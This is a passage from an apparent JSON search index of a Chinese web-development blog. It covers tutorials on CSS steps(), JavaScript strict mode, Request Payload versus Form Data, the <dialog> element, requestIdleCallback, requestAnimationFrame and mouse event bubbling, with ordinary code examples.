函数：steps(number_of_steps, direction) 以等距步长划分动画。number_of_steps 只能是正整数，0、浮点数和负数都无效。direction 是一个关键字，指示跳转发生的时间，默认 end。 关键字有： jump-start：在动画开始时跳转到 first step。 jump-end：在动画结束时跳转到 last step。 jump-both：在动画开始时跳转到 first step，在动画结束时跳转到 last step。 jump-none：在动画开始和结束时都不跳转。 start：相当于 jump-start。 end：相当于 jump-end，默认。 示例 ","link":"https://zkrisj.github.io/post/css-easing-function-de-shi-yong/"},{"title":"如何使用严格模式","content":"介绍 ECMAScript5\\color{lime}{ECMAScript 5}ECMAScript5 开始添加了严格模式，在多个方面改变了 JavaScript 的语义，使 Javascript 在更严格的条件下运行，浏览器能更容易的解析代码，现在已经被大多浏览器实现（包括 IE10）。 它的产生是为了形成与正常代码不同的语义，而不仅仅是 JavaScript 的一个子集，主要目的是： 消除 Javascript 语法的一些不合理、不严谨之处，减少一些怪异行为； 消除代码运行的一些不安全之处，保证代码运行的安全； 修复了一些导致 JavaScript 引擎难以执行优化的缺陷，相同的代码，严格模式可以比非严格模式下运行得更快。 为新版本的 Javascript 做好铺垫。 使用 严格模式可以应用到整个脚本或个别函数中。在 eval 、Function 、内联事件处理属性、WindowTimers.setTimeout() 方法中传入的脚本字符串，其行为类似于开启了严格模式的一个单独脚本，它们会如预期一样工作。在单独的封闭大括弧 {} 内声明是没有效果的。 整个脚本文件 为整个脚本文件开启严格模式，需要在所有语句之前放一个特定语句 &quot;use strict&quot;;（或 'use strict';）。 // 整个脚本都开启严格模式的语法 &quot;use strict&quot;; let s = &quot;Hi! I'm a strict mode script!&quot;; 这种语法存在陷阱，合并均为严格模式的脚本或均为非严格模式的都没问题，但在合并严格模式与非严格模式时可能会有问题。所以不能盲目的合并冲突代码，建议按一个个函数去开启严格模式（至少在学习的过渡期要这样做）。 单个函数 要给某个函数开启严格模式，要把 &quot;use strict&quot;;（或 'use strict';）声明放在函数体所有语句之前。 function strict() { // 函数级别严格模式语法 'use strict'; function nested() { return &quot;And so am I!&quot;; } return &quot;Hi! I'm a strict mode function! &quot; + nested(); } function notStrict() { return &quot;I'm not strict.&quot;; } 语法和行为 严格模式同时改变了语法及运行时行为，变化通常分为这几类：将问题直接转化为错误（如语法错误或运行时错误）, 简化了如何为给定名称的特定变量计算，简化了 eval 以及 arguments。 静默错误转成异常|语法错误 JavaScript 被设计为能使新人开发者更易于上手，所以有时候会给错误操作赋予不报错误的语义 (non-error semantics)。有时候这可以解决当前的问题，但有时候却会给以后留下更大的问题。严格模式则把这些失误当成错误，以便可以发现并立即将其改正。 不能隐式声明全局变量。 &quot;use strict&quot;; // ReferenceError: mistypedVariable is not defined mistypedVariable = 17; 不能给不可写属性，只读属性 (getter-only) ，不可扩展对象 (non-extensible object) 的新属性赋值。 &quot;use strict&quot;; // 给不可写属性赋值 let obj1 = {}; Object.defineProperty(obj1, &quot;x&quot;, { value: 42, writable: false }); obj1.x = 9; // 抛出 TypeError 错误 // 给只读属性赋值 let obj2 = { get x() { return 17; } }; obj2.x = 5; // 抛出 TypeError 错误 // 给不可扩展对象的新属性赋值 let fixed = {}; Object.preventExtensions(fixed); fixed.newProp = &quot;ohai&quot;; // 抛出 TypeError 错误 不能删除不可删除的属性。 &quot;use strict&quot;; delete Object.prototype; // 抛出 TypeError 错误 函数不能有重名参数。正常模式下最后一个重名参数名会掩盖之前的重名参数，之前的参数仍然可以通过 arguments[i] 来访问。 function sum(a, a, c) { // !!! 语法错误 &quot;use strict&quot;; return a + a + c; // 代码运行到这里会出错 } 禁止八进制数字语法。在 ECMAScript 6 中支持为一个数字加&quot;0o&quot;的前缀来表示八进制数，例如 0644 === 420 还有 &quot;\\045&quot; === &quot;%&quot;。 &quot;use strict&quot;; let sum = 015 + // !!! 语法错误 197 + 142; 禁止设置原始类型的属性。不采用严格模式，设置属性将会简单忽略 (no-op)。 (function() { &quot;use strict&quot;; false.true = &quot;&quot;; //TypeError (14).sailing = &quot;home&quot;; //TypeError &quot;with&quot;.you = &quot;far away&quot;; //TypeError })(); 简化变量的使用 Javascript 语言的一个特点，就是允许&quot;动态绑定&quot;，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。严格模式简化了代码中变量名字映射到变量定义的方式。很多编译器的优化是依赖存储变量的位置的能力，这对全面优化 JavaScript 代码至关重要。严格模式移除了大多数这种情况的发生，所以编译器可以更好的优化严格模式的代码。 禁用 with。with 所引起的问题是块内的任何名称可以映射 (map) 到 with 传进来的对象的属性，也可以映射到包围这个块的作用域内的变量 (甚至是全局变量), 这一切都是在运行时决定的：在代码运行之前是无法得知的。 &quot;use strict&quot;; let x = 17; const obj = { x: 1 }; with (obj) { // !!! 语法错误 // 如果没有开启严格模式，with 中的这个 x 会指向 with 上面的那个 x，还是 obj.x？ // 如果不运行代码，我们无法知道，因此，这种代码让引擎无法进行优化，速度也就会变慢。 x; } 一种取代 with 的简单方法是，将目标对象赋给一个短命名变量，然后访问这个变量上的相应属性。 eval 不再为上层范围 (包围 eval 代码块的范围) 引入新变量，仅仅为被运行的代码创建变量。在正常模式下， 代码 eval(&quot;let x;&quot;) 会给上层函数或者全局引入一个新的变量 x，这意味着，在一个包含 eval 调用的函数内所有没有引用到参数或者局部变量的名称都必须在运行时才能被映射到特定的定义 (因为 eval 可能引入的新变量会覆盖它的外层变量)。 let x = 17; let evalX = eval(&quot;'use strict'; let x = 42; x&quot;); console.assert(x === 17); console.assert(evalX === 42); 禁止删除声明变量。 &quot;use strict&quot;; let x; delete x; // !!! 语法错误 eval(&quot;let y; delete y;&quot;); // !!! 语法错误 让 eval 和 arguments 变的简单 严格模式让 arguments 和 eval 少了一些奇怪的行为。两者在通常的代码中都包含了很多奇怪的行为：eval 会添加删除绑定，改变绑定好的值，还会通过用它索引过的属性给形参取别名的方式修改形参。虽然在未来的 ECMAScript 版本解决这个问题之前，是不会有补丁来完全修复这个问题，但严格模式下将 eval 和 arguments 作为关键字对于此问题的解决是很有帮助的。 名称 eval 和 arguments 不能通过程序语法被绑定 (be bound) 或赋值。以下的所有尝试将引起语法错误： &quot;use strict&quot;; eval = 17; arguments++; ++eval; let obj = { set p(arguments) { } }; let eval; try { } catch (arguments) { } function x(eval) { } function arguments() { } let y = function eval() { }; let f = new Function(&quot;arguments&quot;, &quot;'use strict'; return 17;&quot;); 参数的值不会随 arguments 对象的值的改变而变化。在正常模式下，对于第一个参数是 arg 的函数，对 arg 赋值时会同时赋值给 arguments[0]，反之亦然（除非没有参数，或者 arguments[0] 被删除）。严格模式下，函数的 arguments 对象会保存函数被调用时的原始参数。arguments[i] 的值不会随与之相应的参数的值的改变而变化，同名参数的值也不会随与之相应的 arguments[i] 的值的改变而变化。 function f(a) { &quot;use strict&quot;; a = 42; return [a, arguments[0]]; } let pair = f(17); console.assert(pair[0] === 42); console.assert(pair[1] === 17); 不再支持 arguments.callee。正常模式下，arguments.callee 指向当前正在执行的函数。这个作用很小：直接给执行函数命名就可以了！此外，arguments.callee 十分不利于优化，例如内联函数，因为 arguments.callee 会依赖对非内联函数的引用。 &quot;use strict&quot;; let f = function() { return arguments.callee; }; f(); // 抛出类型错误 &quot;安全的&quot; JavaScript 在浏览器环境下，JavaScript 能够获取用户的隐私信息，因此，此类 JavaScript 在运行之前必须进行部分转换，以审查对被禁止功能的访问。JavaScript 的灵活性使得在没有运行时检查的情况下不可能有效地做到这一点。开启严格模式并且用特定的方式调用，就会大大减少在执行时进行检查的必要，从而避免引起性能损耗。 this 不再被封装为对象，而且如果没有指定 this 的话它值是 undefined。对一个普通的函数来说，this 总会是一个对象：不管调用时 this 它本来就是一个对象；还是用布尔值，字符串或者数字调用函数时函数里面被封装成对象的 this；还是使用 undefined 或者 null 调用函数时 this 指向的全局对象。这种自动转化为对象的过程不仅是一种性能上的损耗，同时在浏览器中暴露出全局对象也会成为安全隐患，因为全局对象提供了访问那些所谓安全的 JavaScript 环境必须限制的功能的途径。 &quot;use strict&quot;; function fun() { return this; } console.assert(fun() === undefined); console.assert(fun.call(2) === 2); console.assert(fun.apply(null) === null); console.assert(fun.call(undefined) === undefined); console.assert(fun.bind(true)() === true); fun.caller 和 fun.arguments 都是不可删除的属性而且在存值、取值时都会报错。在普通模式下使用这些广泛实现的 ECMAScript 扩展时，当一个叫 fun 的函数正在被调用的时候，fun.caller 是最后一个调用 fun 的函数，而且 fun.arguments 包含调用 fun 时用的形参。 在一些旧时的 ECMAScript 实现中 arguments.caller 曾经是一个对象，里面存储的属性指向那个函数的变量。这是一个安全隐患，因为它通过函数抽象打破了本来被隐藏起来的保留值；它同时也是引起大量优化工作的原因。出于这些原因，现在的浏览器没有实现它。 function restricted() { &quot;use strict&quot;; restricted.caller; // 抛出类型错误 restricted.arguments; // 抛出类型错误 } restricted(); 为未来的 ECMAScript 版本铺平道路 未来版本的 ECMAScript 很有可能会引入新语法，ECMAScript5 中的严格模式就提早设置了一些限制来减轻之后版本改变产生的影响。如果提早使用了严格模式中的保护机制，那么做出改变就会变得更容易。 implements, interface, let, package, private, protected, public, static和yield 变成了保留的关键字，不能再作为变量名或者形参名。 function package(protected) { // !!! &quot;use strict&quot;; let implements; // !!! interface: // !!! while (true) { break interface; // !!! } function private() { } // !!! } function fun(static) { 'use strict'; } // !!! 总结 &quot;严格模式&quot;体现了 Javascript 更合理、更安全、更严谨的发展方向，有助于更细致深入地理解 Javascript，让你变成一个更好的程序员。 ","link":"https://zkrisj.github.io/post/ru-he-shi-yong-yan-ge-mo-shi/"},{"title":"开发者工具网络面板中的 Request Payload 和 Form Data","content":"介绍 Request Payload 和 Form Data 是浏览器传输给接口的两种格式，这两种方式浏览器是通过 Content-Type 来进行区分的，如果是 application/x-www-form-urlencoded，则为 Form Data 方式，如果是 application/json 或 multipart/form-data，则为 Request Payload 的方式。 开发者工具网络面板 Chrome 96 之前，Request Payload 和 Form Data 信息信息出现在报头边栏里。 比如如下使用 ajax 方式的提交 post 请求得到的响应标头（默认：content-type:text/plain;charset=UTF-8）： content-type:multipart/form-data 提交 post 请求得到的响应标头： content-type:application/x-www-form-urlencoded 提交 post 请求得到的响应标头： Chrome 96 开始，当您想查看网络请求中的 Request Payload 和 Form Data 信息时，可以使用网络面板里面的 Payload（载荷）边栏。 content-type:application/json 提交 post 请求得到的响应标头： content-type:application/x-www-form-urlencoded 提交 post 请求得到的响应标头： content-type:application/x-www-form-urlencoded 请求标头代码： const res = await fetch('https://www.runoob.com/try/ajax/demo_post2.php', { method: 'post', body: 'fname=Henry&amp;lname=Ford', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).then(res =&gt; res.text()); console.log(res); // &lt;p style='color:red;'&gt;你好，Henry Ford，今天过得怎么样？&lt;/p&gt; content-type:application/json 请求标头代码： const res = await fetch('https://www.runoob.com/try/ajax/demo_post2.php', { method: 'post', body: '{&quot;fname&quot;:&quot;Henry&quot;,&quot;lname&quot;:&quot;Ford&quot;}', headers: { 'Content-Type': 'application/json' } }).then(res =&gt; res.text()); console.log(res); // &lt;p style='color:red;'&gt;你好， ，今天过得怎么样？&lt;/p&gt; 可以看到不能得到正确响应，fname 和 lname 没有传递成功，也就是后台只接受 Form Data 的参数，不接受 Request Payload 的参数。 默认请求标头 Content-Type fetch 默认请求标头为：'Content-Type': 'text/plain;charset=UTF-8'。所以使用 fetch 提交 post 或其他 非 get 请求时，一定要设置 Content-Type 请求标头。 axios 默认请求标头为：'Content-Type': 'application/x-www-form-urlencoded'。 axios({ method: 'post', url: 'https://www.runoob.com/try/ajax/demo_post2.php', data: 'fname=Henry&amp;lname=Ford' }); // 或者 axios.post('https://www.runoob.com/try/ajax/demo_post2.php', 'fname=Henry&amp;lname=Ford'); html 表单 enctype 默认：application/x-www-form-urlencoded，get 请求时设置 enctype 属性其他值会被忽略。 &lt;form action=&quot;https://www.runoob.com/try/ajax/demo_post2.php&quot; method=&quot;post&quot;&gt; &lt;input name=&quot;fname&quot;&gt; &lt;input name=&quot;lname&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; ","link":"https://zkrisj.github.io/post/kai-fa-zhe-gong-ju-wang-luo-mian-ban-zhong-de-request-payload-he-form-data/"},{"title":"使用浏览器原生的 <dialog> 元素替换 alert、confirm、prompt 对话框","content":"介绍 alert、confirm、prompt 对话框不能自定义样式和复杂的内容，所以在开发的过程中，我们一般根据自己自己的需求造轮子或者使用第三方的，现在 HTML 5.2 推出了一个新的原生模态对话框元素 &lt;dialog&gt;。 &lt;dialog&gt; 可以通过 showModal 方法显示和 ::backdrop 伪元素自定义遮罩层（mask）样式。遮罩层是用户触发弹出框后，形成的一个对话框与页面主体的分割图层，它的存在可以给用户一个更明显的视觉差效果，同时也避免在对话框显示时与应用程序的其余部分进行交互。 &lt;dialog&gt; 默认定义了基本的用户代理提供的样式，如自动边距、粗边框样式等，也可以使用 CSS 自定义。 属性和方法 HTMLDialogElement.open Boolean，设置或返回对话框是否显示。 HTMLElement.hidden Boolean，设置或返回元素是否隐藏。 HTMLDialogElement.returnValue DOMString，设置或返回对话框的返回值。 HTMLDialogElement.close([returnValue]) 关闭对话框。可选字符串参数，更新对话框的 returnValue。 HTMLDialogElement.show() 无遮罩层显示对话框，即仍然允许与对话框外的内容进行交互。 HTMLDialogElement.showModal() 将对话框显示为遮罩模式，并且将会至于所有其他对话框的顶层（屏蔽其他对话框的交互）。 使用 以下定义了一个简单的 dialog： &lt;button onclick=&quot;i1.showModal()&quot; id=&quot;b1&quot; disabled&gt;showModal&lt;/button&gt; &lt;button onclick=&quot;i1.show();b1.disabled=true&quot; id=&quot;b2&quot;&gt;show&lt;/button&gt; &lt;dialog id=&quot;i1&quot; open&gt; &lt;h2&gt;Hello world.&lt;/h2&gt; &lt;button onclick=&quot;i1.close();b1.disabled=false&quot;&gt;close&lt;/button&gt; &lt;/dialog&gt; &lt;style&gt; dialog::backdrop { background: rgba(0, 0, 0, .3); } &lt;/style&gt; 默认情况下非模态对话框不能通过 Esc 键关闭，当表单通过 method=&quot;dialog&quot; 关联父对话框时，默认表单中的按钮点击触发父对话框的关闭事件，并将按钮的 value 值赋给父对话框的 returnValue。 &lt;dialog open&gt; &lt;p&gt;Greetings, one and all!&lt;/p&gt; &lt;form method=&quot;dialog&quot;&gt; &lt;button&gt;OK&lt;/button&gt; &lt;/form&gt; &lt;/dialog&gt; ","link":"https://zkrisj.github.io/post/shi-yong-liu-lan-qi-yuan-sheng-de-lessdialoggreater-yuan-su-ti-huan-alertconfirmprompt-dui-hua-kuang/"},{"title":"后台任务 window.requestIdleCallback 方法的使用","content":"介绍 与 window.requestAnimationFrame 方法类似，提供了由用户代理（浏览器）决定，在空闲时间自动执行队列任务的能力。这样使开发者能够在主事件循环上执行后台和低优先级工作，而不会影响延迟关键事件，如动画和输入响应。 浏览器的主线程以其事件循环队列为中心，渲染 Document 上待更新展示的内容，执行页面待运行的 JavaScript 脚本，接收来自输入设备的事件，以及分发事件给需要接收事件的元素。此外，事件循环队列还处理与操作系统的交互、浏览器自身用户界面的更新等等。 所以，防止在事件队列中出现卡顿是很重要的。在过去，除了编写尽可能高效的代码和将尽可能多的工作移交给 Worker 之外，没有其他可靠的方法可以做到这一点。Window.requestIdleCallback 允许浏览器告诉您的代码可以安全使用多少时间而不会导致系统延迟，从而有助于确保浏览器的事件循环平稳运行。 Window.requestIdleCallback 旨在为代码提供一种与事件循环协作的方式，以确保系统充分利用其潜能，不会过度分配任务，从而导致延迟或其他性能问题。 语法 // 回调函数执行：当前帧有空闲时间，或者指定时间到了 let id = requestIdleCallback(function someHeavyComputation(deadline) { while((deadline.timeRemaining() &gt; 0 || deadline.didTimeout) &amp;&amp; thereIsMoreWorkToDo) { doWorkIfNeeded(); // 一定会在将来某个比较空闲的时间（或者在指定时间过期后）得到反复执行 } if(thereIsMoreWorkToDo) { id = requestIdleCallback(someHeavyComputation); } }, { timeout: 1000 }); window.cancelIdleCallback(id); callback 一个在事件循环空闲时即将被调用的函数的引用。函数会接收到一个 IdleDeadline 对象的参数，这个参数可以获取当前空闲时间以及回调是否在超时时间前已经执行的状态。 IdleDeadline.timeRemaining() 只读，返回一个浮点值，且会动态更新，因此可以不断检查这个属性，如果还有剩余时间的话，就不断执行某些任务。一旦这个属性等于 0，就把任务分配到下一轮 requestIdleCallback。 IdleDeadline.didTimeout 只读，返回一个布尔值，表示指定的时间是否过期。这意味着，如果回调函数由于指定时间过期而触发，那么你会得到两个结果。 timeRemaining 方法返回 0 didTimeout 属性等于 true options 可选 包括可选的配置参数。具有如下属性： timeout：函数一般会按先进先调用的顺序执行，如果指定了 timeout，且回调在 timeout 毫秒过后还没有被调用，那么回调任务将放入事件循环中排队（即使这样有可能对性能产生负面影响）。负值会被忽略。 返回一个 ID，可以把它传入 Window.cancelIdleCallback 方法来结束回调。如果未指定 timeout 选项，只有当前帧的运行时间小于 16.66ms 时，函数 callback 才会执行，否则，就推迟到下一帧，如果下一帧也没有空闲时间，就推迟到下下一帧，以此类推。强烈建议使用 timeout 选项进行必要的工作，否则可能会在触发回调之前经过几秒钟。可以在一个 idle callback 中调用 Window.cancelIdleCallback，以便在下一次通过事件循环之前调度另一个回调。 使用 setTimeout() 填充 因为后台任务 API 还是相当新的，而你的代码可能需要在那些不仍不支持此 API 的浏览器上运行。你可以把 setTimeout() 用作回调选项来做这样的事。下面这个函数并不是 polyfill ，因为它在功能上并不相同；setTimeout() 并不会让你利用空闲时段，而是使你的代码在情况允许时执行你的代码，以使我们可以尽可能地避免造成用户体验性能表现延迟的后果。 window.requestIdleCallback = window.requestIdleCallback || function(handler) { let startTime = Date.now(); return setTimeout(function() { handler({ didTimeout: false, timeRemaining: function() { return Math.max(0, 50.0 - (Date.now() - startTime)); } }); }, 1); } window.cancelIdleCallback = window.cancelIdleCallback || function(id) { clearTimeout(id); } 每次调用 timeRemaining()，它都会从开始的 50 毫秒中减去已逝去的时间，来确定还剩余的时间。虽然这个填充程序不会像真正的 requestIdleCallback() 将自己限制在当前事件循环传递中的空闲时间内，但它至少将每次传递的运行时间限制为不超过 50 毫秒。尽管效率不高，但也可以在不支持后台任务 API 的浏览器上运行了。 示例 在这个示例中，我们使用 requestIdleCallback() 来在浏览器空闲时运行高耗时、低优先级的任务，requestAnimationFrame() 安排文档内容的更新。 HTML 内容 这里创建了一个盒子 (ID &quot;Container&quot;) 来显示操作进度，因为我们没法知道解码会用多长时间。进度框用一个 &lt;progress&gt; 元素展示进度，随着它标签部分的变化，会呈现进度的数字信息。还创建了一个次要的盒子 (ID &quot;logBox&quot;) 来展示文本输出。 &lt;div id=&quot;container&quot;&gt; &lt;progress id=&quot;progressBarElem&quot; value=&quot;0&quot;&gt;&lt;/progress&gt; &lt;button class=&quot;button&quot; onclick=&quot;decodeTechnoStuff()&quot;&gt;Start&lt;/button&gt; &lt;div class=&quot;label counter&quot;&gt;Task &lt;span id=&quot;currentTaskNumberElem&quot;&gt;0&lt;/span&gt; of &lt;span id=&quot;totalTaskCountElem&quot;&gt;0&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;logBox&quot;&gt; &lt;div class=&quot;logHeader&quot;&gt;Log&lt;/div&gt; &lt;div id=&quot;logElem&quot;&gt;&lt;/div&gt; &lt;/div&gt; totalTaskCountElem 用于插入我们在进度框显示状态中创建的任务总数。 currentTaskNumberElem 是我们用来呈现到当前为止处理过的任务数的元素。 progressBarElem 来呈现到当前为止处理过任务的百分比。 startButtonElem 是开始按钮。 logElem 显示记录过的文本信息。 定义变量 let taskList = []; let totalTaskCount = 0; let currentTaskNumber = 0; let taskHandle = null; let logFragment = null; let statusRefreshScheduled = false; taskList 等待执行的任务列表，是一个对象数组, 每个对象代表一个待运行的任务。 totalTaskCount 是一个已被添加到队列的任务数量计数器，只会增大，不会减小。我们用它计算总工作量进度的百分比值。 currentTaskNumber 用于追踪到现在为止已处理了多少任务。 taskHandle 对当前处理中任务的一个引用。 logFragment 当渲染下一帧，我们的记录方法都会生成一个 DocumentFragment 来创建添加到记录的内容，并保存到 logFragment 中 DocumentFragment。 statusRefreshScheduled 我们用它来追踪我们是否已经为即将到来的帧安排了状态显示框的更新，所以我们每一帧只执行一次。 管理任务队列 接下来，我们管理需要执行的任务。我们将创建一个先进先出（FIFO）的任务队列，在空闲回调期间，如果时间允许，我们将执行这个队列。 排队任务 首先，我们需要一个函数把任务排成队列，以便将来执行。 function enqueueTask(taskHandler, taskData) { taskList.push({ handler: taskHandler, data: taskData }); totalTaskCount++; if (!taskHandle) { taskHandle = requestIdleCallback(runTaskQueue, { timeout: 1000 }); } scheduleStatusRefresh(); } enqueueTask() 接受两个参数作为参数 taskHandler 一个函数，被调用来处理任务。 taskData 一个对象（object），被当作输入参数传递给taskHandler，以允许任务接收自定义数据。 为了把任务排成队列，我们把一个对象（object）push 到 taskList 数组；此对象包含 taskHandler 和 taskData 的值（命名分别是 handler 和 data）。 然后把队列里的任务总数 totalTaskCount 增加（我们不会在从队列中移除任务时减少 totalTaskCount）。 接下来，我们来检查是否已经创建了一个空闲回调；如果 taskHandle 是 0，我们调用 requestIdleCallback() 去创建一个。它被配置为调用一个叫 runTaskQueue() 的函数，它的 timeout 为 1 秒，因此，即使没有任何实际可用的空闲时间，它也至少会每秒运行一次。 执行任务 空闲回调处理方法 runTaskQueue() 将在浏览器确定有足够的可用空闲时间或 1 秒的timeout 到期时被调用。这个方法的作用是执行队列中的任务。 function runTaskQueue(deadline) { while ((deadline.timeRemaining() &gt; 0 || deadline.didTimeout) &amp;&amp; taskList.length) { let task = taskList.shift(); currentTaskNumber++; task.handler(task.data); scheduleStatusRefresh(); } if (taskList.length) { taskHandle = requestIdleCallback(runTaskQueue, { timeout: 1000} ); } else { taskHandle = 0; } } runTaskQueue() 的核心是一个循环，只要有剩余时间（通过检查 IdleDeadline.timeRemaining 来确认它大于 0），或者已经达到了 timeout 期限（deadline.didTimeout 值为真），且任务列表中有任务就会一直持续。 对队列中每个我们有时间要执行的任务，做以下操作： 把任务对象 task 从队列中移除。 让 currentTaskNumber 增加来追踪我们已执行的任务数量。 调用任务处理方法 task.handler，并把任务的数据对象 task.data 传入其中。 调用方法 scheduleStatusRefresh()，更新进度的变化。 当时间耗尽，如果列表里还有任务，我们再次调用 requestIdleCallback() 使我们可以在下次有可用空闲时间时继续运行这些任务。如果队列是空的，我们将把 taskHandle 设置为 0 来表示我们没有回调任务了。这样，下一次 enqueueTask() 被调用时，我们就知道要请求一个回调了。 更新状态显示 在空闲回调中改变 DOM 是不安全的。作为替代，我们使用 requestAnimationFrame() 来让浏览器在可以安全地更新显示时通知我们。 安排显示的更新 调用 scheduleStatusRefresh() 函数来安排 DOM 的改变。 function scheduleStatusRefresh() { if (!statusRefreshScheduled) { requestAnimationFrame(updateDisplay); statusRefreshScheduled = true; } } 通过检查 statusRefreshScheduled 的值来得知我们是否已经安排了一个显示更新。如果值为 false，我们调用 requestAnimationFrame() 来安排一个更新。 更新显示 updateDisplay() 函数负责绘制进度框的内容和记录。当 DOM 的状况安全，我们可以在下次渲染过程中申请改变时，浏览器会调用它。 function updateDisplay() { let scrolledToEnd = logElem.scrollHeight - logElem.clientHeight &lt;= logElem.scrollTop + 1; if (totalTaskCount) { if (progressBarElem.max != totalTaskCount) { totalTaskCountElem.textContent = totalTaskCount; progressBarElem.max = totalTaskCount; } if (progressBarElem.value != currentTaskNumber) { currentTaskNumberElem.textContent = currentTaskNumber; progressBarElem.value = currentTaskNumber; } } if (logFragment) { logElem.appendChild(logFragment); logFragment = null; } if (scrolledToEnd) { logElem.scrollTop = logElem.scrollHeight - logElem.clientHeight; } statusRefreshScheduled = false; } 首先，在记录被滚动到底的时候 scrolledToEnd 会被设置为 true，否则被设置为 false。我们用它来确保给记录添加内容后，更新滚动位置使记录停留在末尾。 接下来，如果有任务进入队列中，我们更新进度和状态信息。 如果进度条当前的最大值（progressBarElem.max）不同于队列中当前的任务总数（totalTaskCount），我们就要更新任务总数（totalTaskCountElem）的显示内容和进度条的最大值（progressBarElem.max），以使它的比例正确。 我们对已运行的任务数做同样的操作；如果 progressBarElem.value 不同于当前正被处理的任务数（currentTaskNumber），我们就要更新当前运行的程序数量值（currentTaskNumberElem.textContent）和进度条当前值的显示（progressBarElem.value）。 然后，如果有文本等待被添加到记录中（logFragment 不为 null），我们使用 Element.appendChild() 将它添加到记录元素中，并将 logFragment 设置为 null 以避免重复操作。 如果我们操作开始的时候记录被滚动到末尾，我们要确保它一直处理末尾的位置。 然后我们将 statusRefreshScheduled 设置为 false，以表明我们已经处理过更新，可以安全地请求新的更新了。 向记录添加文本 function log(text) { if (!logFragment) { logFragment = document.createDocumentFragment(); } let el = document.createElement(&quot;div&quot;); el.innerHTML = text; logFragment.appendChild(el); } 首先如果当前不存在 logFragment 对象，则创建它。DocumentFragment 元素是一个伪 DOM，我们可以在其中插入元素，而无需立即更改主 DOM 本身。 接下来我们向 logFragment 中的伪 DOM 末尾添加一个新的 div 元素。 logFragment 将会累积记录条目，直到下次因 DOM 改变而调用 updateDisplay() 的时候。 运行任务 现在，我们的任务管理和显示维护代码已经完成，可以开始设定完成工作的代码了。 任务处理器 logTaskHandler() 是我们用来作为任务处理器的函数，也是用作任务对象 handler 属性的值。它是一个简单的为每个任务向记录输出大量内容的函数，可以将此代码替换为希望在空闲时间执行的任何任务。只要记住任何 DOM 变化都需要通过 requestAnimationFrame() 处理。 function logTaskHandler(data) { log(&quot;&lt;strong&gt;Running task #&quot; + currentTaskNumber + &quot;&lt;/strong&gt;&quot;); for (i=0; i&lt;data.count; i+=1) { log((i+1).toString() + &quot;. &quot; + data.text); } } 主程序 当用户点击“开始”按钮，会调用 decodeTechnoStuff() 函数，触发所有操作。 function decodeTechnoStuff() { totalTaskCount = 0; currentTaskNumber = 0; updateDisplay(); let n = getRandomIntInclusive(100, 200); for (i=0; i&lt;n; i++) { let taskData = { count: getRandomIntInclusive(75, 150), text: &quot;This text is from task number &quot; + (i+1).toString() + &quot; of &quot; + n }; enqueueTask(logTaskHandler, taskData); } } document.getElementById(&quot;startButton&quot;).addEventListener(&quot;click&quot;, decodeTechnoStuff, false); decodeTechnoStuff() 开始执行时会将任务总数（到现在为止添加到队列中的任务数）清零，并随后调用 updateDisplay() 以重置显示为“没有任何事发生”的状态。 getRandomIntInclusive() 方法创建一个随机数量（100 到 200 之间）的任务。 随后我们开始一个循环以创建实际的任务。对于每个任务，我们创建一个对象 taskData，其中包含两个属性： count 是从任务输出文本到记录中的次数。 text 是要输出到日志的文本。 我们调用 enqueueTask() 来将每个任务排入队列，将 logTaskHandler 传入作为处理函数；将 taskData 传入，待处理函数（logTaskHandler）调用时传入其中。 结果 ","link":"https://zkrisj.github.io/post/hou-tai-ren-wu-windowrequestidlecallback-fang-fa-de-shi-yong/"},{"title":"requestAnimationFrame 的使用","content":"介绍 大多数电脑显示器的刷新频率是60Hz，大概相当于每秒钟重绘60次。大多数浏览器都会对重绘操作加以限制，不超过显示器的重绘频率，因为即使超过那个频率用户体验也不会有提升。因此，最平滑动画的最佳循环间隔是1000ms/60，约等于16.7ms。 setTimeout 和 setInterval 的问题是，它们都不精确。它们的内在运行机制决定了时间间隔参数实际上只是指定了把动画代码添加到浏览器UI线程队列中以等待执行的时间。如果队列前面已经加入了其他任务，那动画代码就要等前面的任务完成后再执行。 requestAnimationFrame 是由浏览器专门为动画提供的API，用法类似于 setTimeout，但是不需要设置时间间隔。 当 requestAnimationFrame() 运行在后台标签页或者隐藏的 &lt;iframe&gt; 里时，requestAnimationFrame() 会被暂停调用，从而就提升性能和电池寿命。 语法 requestID: int = window.requestAnimationFrame(callback); window.cancelAnimationFrame(requestID); 回调函数会被传入一个 double 类型时间戳，该参数与 performance.now() 的返回值相同，它表示开始去执行回调函数的时刻。 在同一个帧中的多个回调函数，它们每一个都会接受到一个相同的时间戳，即使在计算上一个回调函数的工作负载期间已经消耗了一些时间。 返回一个 long 整数，是个非零值，表示请求 ID ，是回调列表中唯一的标识，用于传给 window.cancelAnimationFrame() 以取消回调函数。 使用 &lt;div id=&quot;myDiv&quot;&gt;0%&lt;/div&gt; &lt;script&gt; let start; myDiv.style.width = 0; (function fn() { if (parseInt(myDiv.style.width) &lt; 500) { myDiv.style.width = parseInt(myDiv.style.width) + 5 + 'px'; myDiv.innerHTML = parseInt(myDiv.style.width) / 5 + '%'; timer = requestAnimationFrame(fn); } else cancelAnimationFrame(timer); })(); &lt;/script&gt; &lt;style&gt; div { background: lightblue; width: 0; } &lt;/style&gt; 总结 requestAnimationFrame() 可以让各种网页动画效果（DOM动画、Canvas动画、SVG动画、WebGL动画）能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果。 ","link":"https://zkrisj.github.io/post/requestanimationframe-de-shi-yong/"},{"title":"mouseenter mouseleave mouseover mouseout mousemove 鼠标事件冒泡对比","content":"介绍 mouseenter 当使用定点设备（例如鼠标或触控板）将光标移动到元素上时，会触发 mouseenter 事件。 mouseleave 当使用定点设备（例如鼠标或触控板）将光标移出某个元素时，会触发 mouseleave 事件。 mouseover 当使用定点设备（例如鼠标或触控板）将光标移动到元素或其子元素之一上时，会在元素上触发 mouseover 事件。 mouseout 当使用定点设备（例如鼠标或触控板）将光标移出元素或其子元素之一上时，会在元素上触发 mouseout 事件。 mousemove 当使用定点设备（例如鼠标或触控板）将光标在元素上移动时，mousemove 事件被触发（事件冒泡）。 冒泡 事件冒泡指将事件定向到其预期的目标的过程： 单击按钮并将事件定向到该按钮； 如果为该对象设置了事件处理程序，则触发该事件； 如果没有为该对象设置事件处理程序，则事件会向上冒泡（就像水中的气泡）到对象的父级； 事件从父级冒泡到父级的父级，直到它被处理，或者直到它到达 document 对象为止。 